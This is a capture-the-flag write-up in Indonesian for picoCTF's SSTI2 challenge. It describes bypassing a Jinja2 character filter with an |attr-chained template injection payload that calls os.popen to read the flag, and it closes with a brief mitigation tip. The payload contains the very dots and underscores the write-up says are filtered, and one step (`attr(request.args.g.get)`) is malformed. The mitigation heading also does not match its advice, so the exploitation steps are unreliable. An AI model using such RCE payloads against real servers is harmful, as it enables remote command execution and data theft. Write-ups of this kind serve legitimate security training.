# Writeup: SSTI2 (Challenge ID: 488)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Jinja2 SSTI Character Filter Bypass
- **Difficulty:** Medium
- **Event:** picoCTF 2025
- **Points:** 200
- **Flag:** `academy{sst1_f1lt3r_byp4ss_0a432894}`

---

## Problem Statement & Scope
Aplikasi web berbasis Flask/Jinja2 mengevaluasi template dari input pengguna, namun menerapkan filter ketat yang memblokir karakter titik, kurung siku, dan garis bawah (`.`, `[`, `]`, `_`).

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Server-Side Template Injection (SSTI):** Masukan pengguna dikompilasi langsung ke dalam template Jinja2.
2. **Jinja2 Filter & Request Attribute Bypass:** Filter karakter dapat dilewati dengan memanfaatkan pipe `|attr()` dan menyalurkan string nama atribut sensitif via URL query parameters `request.args`.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. Salurkan parameter URL:
   ```text
   ?g=__globals__&cmd=cat+flag*
   ```
2. Rancang payload Jinja2 menggunakan filter `|attr`:
   ```jinja2
   {{ ()|attr(request.args.g)|attr(request.args.g.get)('__builtins__')|attr('get')('__import__')('os')|attr('popen')(request.args.cmd)|attr('read')() }}
   ```
3. Eksekusi payload menghasilkan Remote Code Execution (RCE) untuk membaca flag dari server.

---

## Flag & Verifikasi
- **Flag:** `academy{sst1_f1lt3r_byp4ss_0a432894}`
- **Verifikasi:** POST `/api/submissions/` mengembalikan `{"correct": true}` (HTTP Status 201).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Jinja2 SandboxedEnvironment:** Selalu render template menggunakan template file statis terpisah dengan `render_template()`, bukan `render_template_string()`.
